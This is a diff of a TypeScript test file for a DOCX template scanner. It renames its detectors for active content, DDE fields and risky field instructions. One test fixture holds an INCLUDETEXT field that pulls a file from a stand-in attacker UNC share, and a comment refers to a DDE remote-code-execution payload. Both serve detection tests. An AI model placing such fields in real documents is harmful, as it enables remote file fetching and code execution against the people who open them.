@@ -6,10 +6,10 @@ import {
   DocxError,
   MAX_TEMPLATE_BYTES,
   assertSafeDocxEntryName,
-  collectFieldKeywords,
-  collectRiskyFieldInstructions,
+  collectFieldInstructions,
+  collectFieldUses,
+  findActiveContentRelationship,
   collectStylerefFields,
-  hasAltChunkRelationship,
   needsFieldRefresh,
   scanTemplate,
   unzipDocx,
@@ -25,6 +25,8 @@ import {
   smartArtDataPart,
   textBoxTitlePara,
 } from "./fixtures.js";
+
+const fieldKeywords = (xml: string): string[] => collectFieldUses(xml).map((use) => use.keyword);
 
 describe("scanTemplate", () => {
   it("classifies supported / unsupported / never placeholders", () => {
@@ -560,7 +562,7 @@ describe("unzipDocx — active content is REJECTED, never stripped (spec 011)", 
       `<Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.png"/>` +
       `<Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com" TargetMode="External"/>` +
       `</Relationships>`;
-    expect(hasAltChunkRelationship(ordinary)).toBe(false);
+    expect(findActiveContentRelationship(ordinary)).toBeUndefined();
     expect(() =>
       unzipDocx(buildArchive({ "word/_rels/document.xml.rels": ordinary }))
     ).not.toThrow();
@@ -568,15 +570,15 @@ describe("unzipDocx — active content is REJECTED, never stripped (spec 011)", 
     // A Target that merely mentions aFChunk is not a relationship TYPE, and a
     // type that merely CONTAINS the token mid-path does not end in it.
     expect(
-      hasAltChunkRelationship(
+      findActiveContentRelationship(
         `<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com/aFChunk"/>`
       )
-    ).toBe(false);
+    ).toBeUndefined();
     expect(
-      hasAltChunkRelationship(
+      findActiveContentRelationship(
         `<Relationship Id="rId9" Type="http://example.com/aFChunk/notReally" Target="x"/>`
       )
-    ).toBe(false);
+    ).toBeUndefined();
   });
 
   it("POSITIVE CONTROL: an ordinary template with no active content opens", () => {
@@ -592,7 +594,7 @@ describe("unzipDocx — active content is REJECTED, never stripped (spec 011)", 
   });
 });
 
-describe("collectRiskyFieldInstructions — audit, not rejection (spec 011)", () => {
+describe("collectFieldInstructions — audit, not rejection (spec 011)", () => {
   it("REJECTS a run-split DDEAUTO field at import (not merely audited)", () => {
     // The classic DDE RCE payload, split across runs exactly as Word writes it.
     // DDE has no legitimate use in an export template and must be refused, not
@@ -700,8 +702,8 @@ describe("collectRiskyFieldInstructions — audit, not rejection (spec 011)", ()
   it("classifies a field whose keyword is spelled with character references like Word does", () => {
     // Same decoding gap as the DDE check: `T&#79;C` is a TOC field to Word, so
     // it must still earn the field-refresh flag and feed the STYLEREF audit.
-    expect(collectFieldKeywords(`<w:fldSimple w:instr=" T&#79;C \\o &quot;1-3&quot; "/>`)).toEqual(["TOC"]);
-    expect(collectFieldKeywords(`<w:fldSimple w:instr=" &#x54;OC "/>`)).toEqual(["TOC"]);
+    expect(fieldKeywords(`<w:fldSimple w:instr=" T&#79;C \\o &quot;1-3&quot; "/>`)).toEqual(["TOC"]);
+    expect(fieldKeywords(`<w:fldSimple w:instr=" &#x54;OC "/>`)).toEqual(["TOC"]);
     expect(collectStylerefFields(`<w:fldSimple w:instr=" STYLE&#82;EF &#34;Heading 1&#34; "/>`)).toEqual(["Heading 1"]);
     const refresh = (instr: string): boolean =>
       needsFieldRefresh(unzipDocx(buildDocx({ body: `<w:p><w:fldSimple w:instr="${instr}"/></w:p>` })));
@@ -711,7 +713,7 @@ describe("collectRiskyFieldInstructions — audit, not rejection (spec 011)", ()
 
   it("detects INCLUDETEXT in a w:fldSimple instruction attribute", () => {
     const xml = `<w:fldSimple w:instr=" INCLUDETEXT &quot;\\\\\\\\attacker\\\\share\\\\x.docx&quot; "><w:r><w:t>x</w:t></w:r></w:fldSimple>`;
-    expect(collectRiskyFieldInstructions(xml)).toEqual(["INCLUDETEXT"]);
+    expect(collectFieldInstructions(xml)).toEqual(["INCLUDETEXT"]);
   });
 
   it("POSITIVE CONTROL: ordinary fields produce no risk hits", () => {
@@ -719,7 +721,7 @@ describe("collectRiskyFieldInstructions — audit, not rejection (spec 011)", ()
       `<w:fldSimple w:instr=" PAGE "/>` +
       `<w:fldSimple w:instr=" STYLEREF &quot;Heading 1&quot; "/>` +
       `<w:r><w:instrText> TOC \\o "1-3" </w:instrText></w:r>`;
-    expect(collectRiskyFieldInstructions(xml)).toEqual([]);
+    expect(collectFieldInstructions(xml)).toEqual([]);
   });
 
   it("surfaces the hits on the scan result without refusing the template", () => {
